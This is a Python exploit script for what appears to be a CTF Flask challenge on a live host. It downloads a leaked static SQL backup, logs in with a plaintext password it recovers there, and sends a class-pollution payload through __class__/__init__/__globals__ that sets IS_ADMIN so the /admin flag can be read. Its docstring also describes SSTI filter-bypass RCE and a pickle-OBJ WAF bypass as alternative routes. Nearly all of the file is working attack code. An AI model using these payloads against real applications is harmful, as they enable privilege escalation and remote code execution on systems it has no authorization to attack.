# -*- coding: utf-8 -*-
"""超大杯flask —— 从 static 备份 → 登录 → 类污染 IS_ADMIN → /admin 拿 flag

目标：http://zpsrdd9p7lls0tp5.neu-nex.fun

链路：
  1) 提示「static 目录下说不定会有什么的备份」→ /static/backup.sql
     泄露 zc / 325X1@n5hUbeI!、admin、以及 goods 里的 flag（999999.99）。
  2) 用 zc 登录，拿到 Flask session（{"logged_in": true}）。
  3) /restock 的 merge(goods, cfg) 可用 __class__ -> __init__ -> __globals__
     污染模块全局变量 IS_ADMIN：
       {"__class__": {"__init__": {"__globals__": {"IS_ADMIN": true}}}}
     （WAF 只查 '{{'/'{%'/'jinja'/'<script'，不拦这种键名。）
  4) GET /admin → {"flag": "..."}。
  另外两条备用链：/restock 的 SSTI（用 \\u007b 绕 '{{' 过滤）可 RCE；
  /buy 的 pickle 用 OBJ 操作码可绕 REDUCE/INST 的 WAF。

运行：python exp.py
"""
import sys
import urllib.error
import urllib.parse
import urllib.request
import http.cookiejar
import json
import re

sys.stdout.reconfigure(encoding="utf-8")

BASE = "http://zpsrdd9p7lls0tp5.neu-nex.fun"


def main():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    def req(path, data=None):
        body = urllib.parse.urlencode(data).encode() if data is not None else None
        headers = {"User-Agent": "Mozilla/5.0"}
        if body:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        r = urllib.request.Request(BASE + path, data=body, headers=headers)
        try:
            resp = op.open(r, timeout=10)
            return resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", "replace")

    # 1) 静态备份
    st, backup = req("/static/backup.sql")
    print("[*] /static/backup.sql ->", st, len(backup), "bytes")
    m = re.search(r"\('zc',\s*'([^']+)'\)", backup)
    password=<REDACTED> if m else "325X1@n5hUbeI!"
    print("[*] zc password =", password)

    # 2) 登录
    st, body = req("/login", {"username": "zc", "password": password})
    print("[*] login ->", st, "session cookies:", [c.name for c in cj])

    # 3) 类污染 IS_ADMIN
    cfg = json.dumps({"__class__": {"__init__": {"__globals__": {"IS_ADMIN": True}}}})
    print("[*] pollution payload =", cfg)
    st, body = req("/restock", {"config": cfg})
    print("[*] restock ->", st)

    # 4) /admin
    for i in range(5):
        st, body = req("/admin")
        print("[*] /admin try %d -> %s %s" % (i, st, body.strip()[:200]))
        if st == 200:
            flag = json.loads(body)["flag"]
            print("[*] FLAG =", flag)
            return flag
    raise SystemExit("failed")


if __name__ == "__main__":
    main()
